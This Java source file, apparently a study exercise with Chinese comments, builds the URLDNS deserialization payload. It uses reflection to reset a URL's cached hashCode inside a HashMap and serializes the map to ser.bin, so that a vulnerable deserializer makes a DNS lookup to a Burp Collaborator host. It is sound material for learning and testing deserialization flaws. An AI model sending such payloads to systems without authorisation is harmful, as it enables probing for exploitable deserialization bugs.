package com.company;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    public  static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        /*
        写对象，序列化
         */
    }
    public static void main(String[] args) throws Exception{
        Person person = new Person("aa",22);
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
        //hashmap.put(new URL("http://kj7cgaecm74q1ub7cy3ooq4pogu6iv.burpcollaborator.net"),1);
        URL url = new URL("http://zru6xjnpdap7s58rmgnufqnej5pwdl.burpcollaborator.net");
        Class c = url.getClass();
        Field HashcodeField = c.getDeclaredField("hashCode");
        HashcodeField.setAccessible(true);
        HashcodeField.set(url,1234);
        hashmap.put(url,1);
        //传一个url进去就可以了
        //serialize(person);
        //不发起请求，而且hashCode改为-1，反序列化的时候就可以解析dns
        //把hashCode改为-1
        HashcodeField.set(url,-1);
        serialize(hashmap);
        System.out.println(person);


    }

}
